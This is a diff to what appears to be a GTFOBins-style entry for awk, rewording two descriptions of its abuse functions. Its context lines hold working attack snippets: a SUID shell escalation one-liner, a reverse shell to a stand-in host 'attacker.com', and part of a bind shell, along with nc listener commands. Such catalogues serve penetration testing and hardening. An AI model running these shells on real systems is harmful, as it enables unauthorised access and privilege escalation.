@@ -7,7 +7,7 @@ functions:
   suid-limited:
     - code: ./awk 'BEGIN {system("/bin/sh -p")}'
   reverse-shell-non-interactive:
-    - description: Run `nc -l -p 12345` to receive the shell on the other end.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         RHOST=attacker.com
         RPORT=12345
@@ -16,7 +16,7 @@ functions:
             while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
             while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
   bind-shell-non-interactive:
-    - description: Run `nc target.com 12345` to connect to the shell on the other end.
+    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
       code: |
         LPORT=12345
         awk -v LPORT=$LPORT 'BEGIN {
